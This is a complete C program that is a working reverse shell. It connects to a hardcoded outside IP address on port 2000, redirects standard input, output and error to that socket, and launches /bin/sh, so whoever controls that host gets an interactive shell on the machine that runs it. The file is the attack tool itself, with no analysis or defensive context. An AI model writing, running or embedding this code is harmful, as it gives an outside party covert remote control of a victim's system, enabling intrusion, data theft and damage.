#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>

#define REMOTE_ADDRESS "188.166.177.208"
#define REMOTE_PORT 2000

int main()
{
    // Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);    // Port
    addr.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);  // Connection IP

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        perror("Socket creation failed.\n");
        exit(EXIT_FAILURE);
    }

    // Connect socket
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        perror("Socket connection failed.\n");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Duplicate stdin, stdout, stderr to socket
    dup2(sock, 0); //stdin
    dup2(sock, 1); //stdout
    dup2(sock, 2); //stderr
    
	//Execute shell
	system("/bin/sh");

}
